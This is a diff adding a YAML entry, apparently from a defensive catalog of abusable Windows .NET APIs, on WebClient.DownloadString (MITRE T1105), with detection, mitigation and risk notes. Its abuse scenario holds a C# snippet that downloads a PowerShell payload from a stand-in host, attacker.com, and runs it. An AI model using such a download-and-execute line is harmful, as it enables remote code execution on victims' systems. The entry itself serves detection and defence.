@@ -1,0 +1,52 @@
+name: System.Net.WebClient.DownloadString
+category: windows-dotnet-api
+subcategory: resource-retrieval
+api:
+  namespace: System.Net
+  language: .NET 2.0+
+  documentation: https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring
+  class: WebClient
+  method: DownloadString
+abuse_scenarios:
+- name: Download and execute remote script
+  technique_id: T1105
+  description: Fetch PowerShell code from remote server and execute
+  code_snippet: WebClient wc = new WebClient(); string code = wc.DownloadString("http://attacker.com/payload.ps1");
+    System.Diagnostics.Process.Start("powershell.exe", code);
+  detection_difficulty: medium
+  common_in_campaigns: true
+detection:
+- vendor: Network IDS
+  effectiveness: high
+  notes: Monitor HTTP connections from non-browser processes
+- vendor: Microsoft Defender
+  effectiveness: medium
+  notes: Behavioral detection of suspicious downloads
+mitigation:
+- category: policy
+  description: Block outbound HTTP for sensitive processes
+  feasibility: high
+risk:
+  severity: high
+  prevalence: widespread
+  ease_of_abuse: easy
+  likelihood_in_real_attacks: 80
+references:
+  techniques:
+  - T1105
+  threat_actors:
+  - APT29
+  - FIN7
+  malware_families:
+  - PowerShell-based malware
+  tools:
+  - Cobalt Strike
+  - Empire
+tags:
+- windows-dotnet-api
+- download
+- rce
+id: d3a95629-dea8-4bb9-86ee-0d5ee365182e
+author: magicsword-io
+created: '2026-02-02'
+verified: true
